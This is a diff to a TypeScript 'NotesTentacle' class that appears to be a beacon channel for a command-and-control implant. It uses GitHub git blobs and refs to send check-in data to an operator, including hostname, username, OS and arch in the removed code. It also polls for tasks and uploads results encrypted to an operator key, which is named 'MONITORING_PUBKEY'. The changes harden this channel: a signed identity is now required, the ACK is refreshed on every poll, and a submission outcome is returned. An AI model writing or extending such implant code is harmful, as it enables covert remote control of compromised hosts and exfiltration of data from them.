@@ -20,9 +20,14 @@
 import { BaseTentacle } from "./BaseTentacle.ts";
 import {
   decryptBox, sealBox,
-  bytesToBase64, base64ToBytes,
+  base64ToBytes,
 } from "../crypto/sodium.ts";
-import type { CheckinPayload, Task, TaskResult } from "../types.ts";
+import type {
+  CheckinPayload,
+  Task,
+  TaskResult,
+  ResultSubmissionOutcome,
+} from "../types.ts";
 
 const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";
 
@@ -30,7 +35,6 @@ export class NotesTentacle extends BaseTentacle {
   readonly kind = "notes" as const;
 
   private operatorPublicKey: Uint8Array | null = null;
-  private ackSent   = false;
   private lastTaskSha: string | null = null;
 
   // ── Ref name helpers ─────────────────────────────────────────────────────────
@@ -100,26 +104,19 @@ export class NotesTentacle extends BaseTentacle {
   // ── Checkin ──────────────────────────────────────────────────────────────────
 
   async checkin(payload: CheckinPayload): Promise<Task[]> {
-    const operatorPubKey = await this.getOperatorPublicKey();
+    if (!payload.identity) {
+      throw new Error("NotesTentacle: signed checkin identity is required");
+    }
     const { owner, name: repo } = this.config.repo;
 
-    // 1. Send ACK on first checkin (registers this beacon with NotesChannel)
-    if (!this.ackSent) {
-      const ackContent = JSON.stringify({
-        beaconId:  this.config.id,
-        publicKey: await bytesToBase64(this.config.beaconKeyPair.publicKey),
-        hostname:  payload.hostname,
-        username:  payload.username,
-        os:        payload.os,
-        arch:      payload.arch,
-        checkinAt: payload.checkinAt,
-      });
-      const ackBlob = await this.octokit.rest.git.createBlob({
-        owner, repo, content: ackContent, encoding: "utf-8",
-      });
-      await this.upsertRef(this.ackRef, this.ackRefFull, ackBlob.data.sha);
-      this.ackSent = true;
-    }
+    // 1. Refresh the ACK ref with a new signed blob before every task poll.
+    const ackContent = JSON.stringify(payload);
+    const ackBlob = await this.octokit.rest.git.createBlob({
+      owner, repo, content: ackContent, encoding: "utf-8",
+    });
+    await this.upsertRef(this.ackRef, this.ackRefFull, ackBlob.data.sha);
+
+    const operatorPubKey = await this.getOperatorPublicKey();
 
     // 2. Poll task ref SHA
     let currentSha: string;
@@ -170,7 +167,7 @@ export class NotesTentacle extends BaseTentacle {
 
   // ── Submit result ────────────────────────────────────────────────────────────
 
-  async submitResult(result: TaskResult): Promise<void> {
+  async submitResult(result: TaskResult): Promise<ResultSubmissionOutcome> {
     const operatorPubKey = await this.getOperatorPublicKey();
     const { owner, name: repo } = this.config.repo;
 
@@ -187,6 +184,12 @@ export class NotesTentacle extends BaseTentacle {
       owner, repo, content: sealed, encoding: "utf-8",
     });
     await this.upsertRef(resultRef, resultRefFull, blob.data.sha);
+    return {
+      artifactWritten: true,
+      controllerAccepted: false,
+      channel: "notes",
+      acceptance: null,
+    };
   }
 
   override async teardown(): Promise<void> {}
